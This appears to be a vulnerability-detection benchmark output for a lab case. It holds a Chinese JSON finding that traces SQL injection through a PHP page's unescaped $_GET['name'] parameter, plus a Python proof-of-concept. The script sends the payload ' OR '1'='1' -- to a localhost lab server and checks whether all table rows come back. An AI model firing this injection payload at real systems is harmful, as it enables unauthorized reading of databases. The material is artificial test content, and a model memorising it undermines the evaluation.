@@ -1,0 +1,109 @@
+json
+复制
+下载
+{
+  "sample_id": "S001",
+  "prediction": "vulnerable",
+  "vulnerability_type": "SQL注入",
+  "locations": [
+    "F01:0007",
+    "F01:0010",
+    "F01:0011",
+    "F01:0012",
+    "F01:0021",
+    "F01:0022",
+    "F01:0023"
+  ],
+  "evidence": {
+    "source": "F01:0007 从 $_GET['name'] 读取外部输入，未做绑定或转义。",
+    "flow": "F01:0010 将 $name 直接拼接到 WHERE name = '...' 字符串中；F01:0011 将该 SQL 交给 $db->query($sql) 执行；F01:0012 取回结果并在 F01:0021-F01:0023 展示。",
+    "guard": "无效：F01:0010 处没有预处理绑定、mysqli_real_escape_string 或白名单；F01:0022-F01:0023 的 htmlspecialchars 只做输出转义，不保护 SQL 结构。",
+    "sink": "F01:0011 $db->query($sql) 执行拼接后的动态 SQL，外部输入可改变 WHERE 条件语义。"
+  },
+  "prerequisites": [
+    "PHP + MariaDB 运行于 http://127.0.0.1:4280，入口 /lab_cases/S001/index.php 可访问。",
+    "common/db_connect.php 按运行上下文提供已连接的 mysqli 变量 $db。",
+    "lab_people 表存在，并预置 1 Alice、2 Bob、3 Carol。",
+    "页面无需登录，查询结果在 HTML 正文的 <p>ID ...：...</p> 中展示。"
+  ],
+  "missing_context": [
+    "common/db_connect.php 的具体实现未展开；本判定依据运行上下文声明的已连接 $db，不依赖其具体实现。"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "将脚本保存为 poc_s001.py 后运行 python3 poc_s001.py。脚本固定访问 http://127.0.0.1:4280/lab_cases/S001/index.php，不跟随重定向。普通对照请求 name=Alice，预期解析到且仅解析到记录 (1,Alice)。测试请求 name=' OR '1'='1' -- ，预期解析到 (1,Alice)、(2,Bob)、(3,Carol)。成功条件是解析后的业务记录集合与预期完全一致，而不是仅检查 HTTP 200 或字符串出现。若普通对照失败，检查入口路径、db_connect.php 连接、lab_people 预置数据；若测试请求未返回三条记录，检查 MariaDB 的 -- 注释语法、错误日志和表数据。"
+}
+python
+复制
+下载
+import http.client
+import urllib.parse
+import re
+import html
+import sys
+
+HOST = "127.0.0.1"
+PORT = 4280
+PATH = "/lab_cases/S001/index.php"
+
+
+def fetch(name):
+    query = urllib.parse.urlencode({"name": name})
+    conn = http.client.HTTPConnection(HOST, PORT, timeout=5)
+    conn.request(
+        "GET",
+        PATH + "?" + query,
+        headers={"Host": f"{HOST}:{PORT}", "Accept": "text/html"},
+    )
+    resp = conn.getresponse()
+    body = resp.read().decode("utf-8", "replace")
+    status = resp.status
+    conn.close()
+    return status, body
+
+
+def parse_rows(body):
+    pattern = re.compile(r"<p>\s*ID\s*(\d+)\s*[：:]\s*(.*?)\s*</p>", re.S)
+    rows = []
+    for match in pattern.finditer(body):
+        row_id = match.group(1)
+        row_name = html.unescape(re.sub(r"<[^>]+>", "", match.group(2))).strip()
+        rows.append((row_id, row_name))
+    return sorted(rows)
+
+
+def main():
+    expected_normal = sorted([("1", "Alice")])
+    expected_test = sorted([("1", "Alice"), ("2", "Bob"), ("3", "Carol")])
+
+    status_normal, body_normal = fetch("Alice")
+    status_test, body_test = fetch("' OR '1'='1' -- ")
+
+    normal_rows = parse_rows(body_normal)
+    test_rows = parse_rows(body_test)
+
+    print("普通请求 HTTP:", status_normal, "解析记录:", normal_rows)
+    print("测试请求 HTTP:", status_test, "解析记录:", test_rows)
+
+    if status_normal != 200:
+        print("普通对照失败：HTTP 状态不是 200。")
+        return 2
+
+    if normal_rows != expected_normal:
+        print("普通对照失败：未仅返回 ID 1 Alice，请检查入口、数据库连接和 lab_people 预置数据。")
+        return 3
+
+    if status_test != 200:
+        print("测试请求失败：HTTP 状态不是 200。")
+        return 4
+
+    if test_rows != expected_test:
+        print("测试请求未返回预期的受控业务记录，不能判定注入已触发；请检查 MariaDB 注释语法、表数据和错误输出。")
+        return 5
+
+    print("判定：测试请求返回了普通请求之外的业务记录，SQL 注入路径可达。")
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
